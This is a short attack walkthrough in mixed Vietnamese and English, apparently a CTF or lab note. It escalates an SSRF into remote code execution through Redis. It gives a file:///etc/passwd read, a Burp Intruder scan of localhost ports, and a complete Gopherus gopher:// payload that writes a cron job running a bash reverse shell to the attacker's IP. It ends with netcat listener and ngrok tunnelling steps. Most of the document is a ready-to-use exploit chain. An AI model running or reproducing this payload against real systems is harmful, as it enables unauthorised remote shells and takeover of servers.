## Step 1: file:///etc/passwd
=> SSRF
## Step 2: Scan port by Intruder of burp suite
url = localhost:$port$
vì nhiều server nó chỉ mở port cho các máy cục bộ kết nối nên scan từ ngoài nhiều khi ko đc (lỗi ở đây là mình lợi dụng localhost)
=> port 6379 (redis)
## Step 3: Gopherus
> gopherus --exploit redis
> reverseshell
==> payload (via Cron)
--==[[ Example ]]==--

	gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/myIP/myPort 0>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a

## Step 4: 
On my PC: 
> nc -lvnp 1234

up payload to SSRF box.

==> done

# Note: 
if !vps: ==> can use ngrok để có thể nc được ra ngoài LAN
> ngrok tcp 1234
*sửa payload thành IP(hoặc url) và port của ngrok*
máy mình vẫn nc như trên bình thường.